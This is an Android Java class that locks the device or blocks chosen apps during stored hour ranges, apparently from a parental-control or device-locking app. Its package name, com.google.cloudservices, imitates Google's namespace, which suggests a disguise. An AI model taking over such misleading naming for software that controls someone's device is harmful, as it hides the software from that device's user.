package com.google.cloudservices;

import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;


import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;

public class BlockTask {
    int i=0;
    String[] m;
    ArrayList<String> block1=new ArrayList<String>();

    public void blockk(final Context context){
        LockStatusDB lockStatusDB=new LockStatusDB(context);
        if (lockStatusDB.getlock().equals("1")){
            CurrentAppClass currentAppClass=new CurrentAppClass();
            switch (currentAppClass.getTopAppName(context)){
                case "pro.tasking":
                    break;
                default:
                    Intent lockIntent = new Intent(context, LockActivity.class);
                    lockIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(lockIntent);
                    break;
            }
        }else {
            blockAppdb blockAppdb=new blockAppdb(context);
            if (blockAppdb.getjs().size()>0){
                Date currentTime = Calendar.getInstance().getTime();
                String hn= String.valueOf(currentTime.getHours());
                Date time3 = null;
                try {
                    time3 = new SimpleDateFormat("HH").parse(hn);
                } catch (ParseException e) {
                    e.printStackTrace();
                }

                Calendar calendar3 = Calendar.getInstance();
                calendar3.setTime(time3);
                calendar3.add(Calendar.DATE, 1);
                Date x=calendar3.getTime();
                while (i<blockAppdb.getjs().size()){
                    String[] s=blockAppdb.getjs().get(i).split(":");
                    blockAppdb.close();
                   // Runtime.getRuntime().gc();

                    String pkg=s[0];

                    //Log.e("blockk", ftime+stime);
                    try {

                    Date time1 = new SimpleDateFormat("HH").parse(s[1]);

                    Calendar calendar1 = Calendar.getInstance();
                    calendar1.setTime(time1);
                    calendar1.add(Calendar.DATE, 1);
                    Date time2 = new SimpleDateFormat("HH").parse(s[2]);
                    Calendar calendar2 = Calendar.getInstance();
                    calendar2.setTime(time2);
                    calendar2.add(Calendar.DATE, 1);

                    if (x.after(calendar1.getTime()) && x.before(calendar2.getTime())) {
                        //checkes whether the current time is between 14:49:00 and 20:11:13.
                        block1.add(pkg);

                    }
                } catch (ParseException e) {
                    e.printStackTrace();
                }
                    i++;
                }

                CurrentAppClass currentAppClass=new CurrentAppClass();
            if (block1.contains(currentAppClass.getTopAppName(context))&&currentAppClass.getTopAppName(context)!="pro.tasking"){
                Handler handler=new Handler(Looper.getMainLooper());
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        Intent lockIntent = new Intent(context, BlockActivity.class);
                        lockIntent.putExtra("photoType","backfg");
                        lockIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(lockIntent);
                    }
                });





            }
        }
        blockAppdb.close();

        lockStatusDB.close();

        }
    }
}
